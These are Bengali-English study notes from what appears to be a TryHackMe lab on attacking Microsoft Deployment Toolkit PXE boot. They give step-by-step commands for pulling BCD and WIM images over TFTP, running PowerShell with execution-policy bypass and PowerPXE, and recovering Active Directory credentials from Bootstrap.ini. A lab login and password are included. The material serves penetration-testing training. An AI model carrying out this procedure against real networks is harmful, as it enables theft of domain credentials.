# **Microsoft Deployment Toolkit (MDT)**

### **1. MDT & SCCM**

**MDT (Microsoft Deployment Toolkit):**

- নতুন Windows OS automatically install/deploy করে।
- Central location থেকে Windows installation images manage করে।
- Boot image-এ Office, Antivirus ইত্যাদি pre-install করা যায়।

**SCCM (System Center Configuration Manager):**

- Installed software ও OS-এর updates manage করে।
- Updates test করে সব domain-joined computers-এ deploy করে।
- MDT মূলত নতুন OS deployment করে, SCCM installation-এর পর software ও updates manage করে।

### **2. PXE Boot**

**PXE (Preboot Execution Environment):** USB/DVD ছাড়াই network দিয়ে computer-এ OS install করার পদ্ধতি।

<img width="1436" height="270" alt="image" src="https://github.com/user-attachments/assets/f8d9ed6f-94bd-4874-afe0-840459153a77" />

[it-connect.fr](https://www.it-connect.fr/pxe-sur-linux-windows-et-pourquoi-pas-les-deux/?utm_source=chatgpt.com)

**Process:**

1. Computer network-এ connect করে।
2. DHCP থেকে IP ও PXE boot information পায়।
3. MDT server-এর information পায়।
4. TFTP দিয়ে PXE boot image download করে।
5. Windows installation শুরু হয়।

**Pentesting Risk:**

PXE Boot image থেকে:

- Local Administrator account inject করে privilege পাওয়া সম্ভব।
- Installation-এর সময় ব্যবহৃত AD credentials recover করা সম্ভব।

### **3. PXE Boot Image Retrieval**

**Step 1: SSH Connection**

```
ssh thm@THMJMP1.za.tryhackme.com
```

Password:

```
Password1@
```

**Step 2: PowerPXE Setup**

```
cd Documents
mkdir <username>
copy C:\powerpxe <username>\
cd <username>
```

Tool: [PowerPXE GitHub](https://github.com/wavestone-cdt/powerpxe?utm_source=chatgpt.com)

**Step 3: MDT Server IP বের করা**

```
nslookup thmmdt.za.tryhackme.com
```

**Step 4: BCD File খুঁজে বের করা**

Website:

[http://pxeboot.za.tryhackme.com](http://pxeboot.za.tryhackme.com?utm_source=chatgpt.com)

- এখানে বিভিন্ন architecture-এর BCD files পাওয়া যায়।
- x64 architecture-এর BCD filename সংগ্রহ করো।
- Filename প্রতিদিন regenerate হয়।
- Network চালু হওয়ার পর filename update হতে প্রায় 10 মিনিট লাগতে পারে।

**BCD:** Boot Configuration Data। PXE boot-এর configuration information রাখে।

**Step 5: BCD Download**

```
tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
```

- TFTP দিয়ে BCD download করা হয়।
- BCD files থাকে `/Tmp/` directory-তে।
- TFTP-তে directory listing করা যায় না; নির্দিষ্ট filename request করতে হয়।

### **4. Extract PXE Boot Image**

PowerShell চালাও:

```
powershell -executionpolicy bypass
```

PowerPXE import:

```
Import-Module .\PowerPXE.ps1
```

BCD file select:

```
$BCDFile = "conf.bcd"
```

WIM file location বের করো:

```
Get-WimFile -bcdFile $BCDFile
```

**WIM:** Windows Imaging Format। Windows bootable image রাখে।

এবার image download:

```
tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
```

### **5. Recover AD Credentials**

PowerPXE দিয়ে credentials বের করো:

```
Get-FindCredentials -WimFile pxeboot.wim
```

এটি WIM image-এর ভিতরে `Bootstrap.ini` খুঁজে credentials recover করে।

Example output:

```
DeployRoot = \\THMMDT\MTDBuildLab$
UserID = <account>
UserDomain = ZA
UserPassword = <password>
```

**Important:**

- `Bootstrap.ini` = Deployment-এর configuration file।
- `DeployRoot` = MDT deployment share location।
- `UserID` = Deployment account।
- `UserDomain` = Domain name।
- `UserPassword` = Account password।

এখান থেকে valid AD credentials পাওয়া সম্ভব।

### **6. Pentesting-এর জন্য গুরুত্বপূর্ণ**

| Concept       | Attack Opportunity                 |
| ------------- | ---------------------------------- |
| MDT           | Deployment credentials exposure    |
| SCCM          | Central software/update management |
| PXE Boot      | Network boot image retrieval       |
| TFTP          | BCD ও WIM download                 |
| BCD           | Boot configuration information     |
| WIM           | Windows boot image                 |
| Bootstrap.ini | Stored credentials                 |
| PowerPXE      | PXE image থেকে credentials recover |


### **Quick Revision**

```
MDT → Windows Deployment
SCCM → Software & Update Management

PXE → Network Boot
DHCP → IP & Boot Information
TFTP → Download BCD & WIM
BCD → Boot Configuration
WIM → Windows Image
Bootstrap.ini → Deployment Credentials

PowerPXE:
Get-WimFile → Find WIM Location
Get-FindCredentials → Recover Credentials
```
